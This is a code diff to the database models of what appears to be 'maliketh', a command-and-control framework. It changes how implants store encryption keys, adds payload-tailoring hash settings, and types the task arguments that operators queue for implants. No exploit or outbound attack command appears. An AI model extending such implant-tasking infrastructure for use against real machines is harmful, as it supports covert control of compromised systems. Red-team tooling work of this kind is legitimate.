@@ -1,9 +1,11 @@
 from dataclasses import dataclass, asdict
 from datetime import datetime
 from maliketh.db import db
+import base64
 import os
 import sys
 import json
+import yaml
 
 
 # Job statuses
@@ -39,11 +41,10 @@ class Implant(db.Model):
     os: str = db.Column(db.String)
     arch: str = db.Column(db.String)
     user: str = db.Column(db.String)
-    aes_key: str = db.Column(db.String)  # Base64 encoded AES key
-    aes_aad: str = db.Column(db.String)  # Base64 encoded AES-GCM AAD
+    server_sk: str = db.Column(db.String)  # The Base64 encoded private key (of the server, EC) to use for encryption
+    implant_pk: str = db.Column(db.String)  # The Base64 encoded public key (of the implant, EC) to use for encryption
     created_at: str = db.Column(db.String)
     last_seen: str = db.Column(db.String)
-    
 
     def toJSON(self):
         return asdict(self)
@@ -63,8 +64,12 @@ class ImplantConfig(db.Model):
     """
 
     id = db.Column(db.Integer, primary_key=True)
-    implant_id: str = db.Column(db.String)
-    cookie: str = db.Column(db.String)  # The cookie name to use for implant identification
+    implant_id: str = db.Column(
+        db.String
+    )  # The implant ID this config belongs to (note this is not the `id` field of Implant, rather the `implant_id` field))
+    cookie: str = db.Column(
+        db.String
+    )  # The cookie name to use for implant identification
     kill_date: str = db.Column(db.String)  # The timestamp of the kill date
     sleep_time: int = db.Column(
         db.Integer
@@ -75,9 +80,15 @@ class ImplantConfig(db.Model):
     max_retries: int = db.Column(
         db.Integer
     )  # The number of times to retry a task before giving up. -1 for infinite
+    enc_key: str = db.Column(
+        db.String
+    )  # The Base64 encoded public key (of the server, EC) to use for encryption
     tailoring_hash_function: str = db.Column(
         db.String
     )  # The hash function to use for payload tailoring
+    tailoring_hash_rounds: str = db.Column(
+        db.Integer
+    )  # The number of rounds to use for the given hash function
     tailoring_hashes: str = db.Column(
         db.String
     )  # The hashes to use for payload tailoring
@@ -89,26 +100,31 @@ class ImplantConfig(db.Model):
 
         return dicted
 
-    
+    def toYAML(self):
+        return yaml.dump(self.toJSON())
+
     @staticmethod
-    def create_min_config(implant_id: str, cookie: str) -> "ImplantConfig":
+    def create_min_config(implant_id: str, cookie: str, b64_server_pub: str) -> "ImplantConfig":
         """
         Helper to create a new config with the minimum required fields, and add it to the database.
         """
+
         config = ImplantConfig(
             implant_id=implant_id,
             kill_date="",
             sleep_time=60,
             jitter=0.1,
             max_retries=-1,
+            enc_key=b64_server_pub,
             tailoring_hash_function="",
+            tailoring_hash_rounds=100,
             tailoring_hashes="",
             cookie=cookie,
         )
         db.session.add(config)
         db.session.commit()
         return config
-    
+
     def add_hash(self, hash: str) -> None:
         """
         Add a hash to the tailoring hashes
@@ -154,7 +170,7 @@ class Task(db.Model):
         db.String
     )  # The ID of the implant that this task is assigned to
     opcode: int = db.Column(db.Integer)  # The opcode of the task
-    args: str = db.Column(db.String)  # The arguments of the task
+    args: str = db.Column(db.ARRAY(db.String))  # The arguments of the task
     status: str = db.Column(db.String)  # The status of the task
     output: str = db.Column(db.String)  # The output of the task
     created_at: str = db.Column(db.String)  # The datetime the task was created
@@ -165,7 +181,7 @@ class Task(db.Model):
 
     def toJSON(self):
         return asdict(self)
-
+        
     @staticmethod
     def new_task(operator_name: str, implant_id: str, opcode: int, args: str):
         """
